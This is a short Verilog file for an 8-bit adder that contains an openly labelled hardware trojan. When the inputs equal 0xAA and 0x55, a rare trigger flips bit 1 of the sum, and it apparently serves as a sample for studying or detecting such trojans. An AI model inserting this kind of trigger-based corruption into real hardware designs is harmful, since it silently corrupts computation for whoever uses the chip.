module add8(input [7:0] a, input [7:0] b, output [8:0] sum);
  // Trojan: rare trigger when a==8'hAA and b==8'h55
  wire trojan_trigger;
  wire [8:0] clean_sum;
  wire [8:0] degraded_sum;

  assign clean_sum = a + b;

  // Trigger fires on a specific rare 8-bit pattern pair
  assign trojan_trigger = (a == 8'hAA) & (b == 8'h55);

  // Degraded path: introduce bit corruption in the sum (bit 1 flipped),
  // forcing extra mux logic into the critical path
  assign degraded_sum = clean_sum ^ 9'h002;

  // Output mux: selects degraded result on trigger, clean otherwise
  assign sum = trojan_trigger ? degraded_sum : clean_sum;
endmodule